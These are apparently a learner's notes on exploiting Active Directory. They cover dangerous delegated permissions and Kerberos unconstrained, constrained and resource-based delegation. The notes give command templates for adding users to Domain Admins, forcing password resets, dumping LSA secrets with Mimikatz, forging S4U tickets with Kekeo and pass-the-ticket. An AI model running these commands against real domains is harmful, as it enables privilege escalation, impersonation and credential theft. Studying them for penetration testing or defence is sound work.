# Exploiting Active Directory

## Insecure Permission Delegation

Basically when permissions are mismanaged and allow for exploitation vecotrs. Some key permissions to look for are:
- `ForceChangePassword`: We have the ability to set the user's current password without knowing their current password.
- `AddMembers`: We have the ability to add users (including our own account), groups or computers to the target group.
- `GenericAll`: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- `GenericWrite`: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- `WriteOwner`: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- `WriteDACL`: We have the ability to write new access control entries (ACEs) to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- `AllExtendedRights`: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

Depending on which overly permissive misconfiguration is implemented, can escalate privileges or perform other exploits in the AD network: e.g. change passwords for higher-privileged users.

E.g.:

```
C:\> net group "Domain Admins" <USER> /add /domain                                                                                                  // To add a user
PS C:\> Set-ADAccountPassword -Identity '<DISTINGUISHED_NAME>' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<NEW_PASSWORD>" -Force)    // Reset password
C:\> net user <USERNAME> <NEW_PASSWORD>                                                                                                             // Reset password
```

## Insecure Kerberos Delegation

### Kerberos vs. Permissions Delegation

Permissions delegation applies permissions directly to AD service accounts to access other services. When a user interacts with a service running on the service accounts and then want to interact with other services, they will be granted access to the whole service functionality.

Kerberos delegation lets you delegate access to a service based on the user's context so that they can only see the necessary amount of data.

### Unconstrained Delegation

This is when Kerberos delegation does not restrict what services an account can be delegated to. If an attacker compromises a host that has unconstrained delegation enabled, they can force authentication from a `TRUSTED_FOR_DELEGATION` high privilege user and extract the TGT and impersonate this user for access to those other services.

### Constrained Delegation

More common and secure; Kerberos delegation will restrict the services that the account has access to.

Example services codes: HTTP, CIFS, LDAP, HOST, MSSQL ... - 1+ of these services codes can you let you spawn different interactions on the target service, e.g. HTTP + WSMAN = PowerShell

### Resource-Based Constrained Delegation (RBCD)

Same as constrained delegation but rather than assigning delegations from the object's side, they are assigned on the delegated service's side instead. Newer, slightly more secure but still hackable.

### Procedure

1. To identify delegations with PowerSploit: `Get-NetUser -TrustedToAuth`.
2. If found, use Mimikatz to dump secrets for service account with delegation
```
privilege::debug
token::elevate
lsadump::secrets
```
3. Use Kekeo (Kerberos tool) to acquire TGT for service account using secrets from Kerberos service and acquire service ticket from TGS using TGT
```
tgt::ask /user:<service_account_name> /password:<service_account_pass> /domain:<domain>
tgs::s4u /tgt:<TGT> /user:<impersonated_user> /service:<service_code>/<hostname>
```
4. Use Mimikatz to import impersonated service tickets:
```
privilege::debug
kerberos::ptt <serviced_ticket>
```
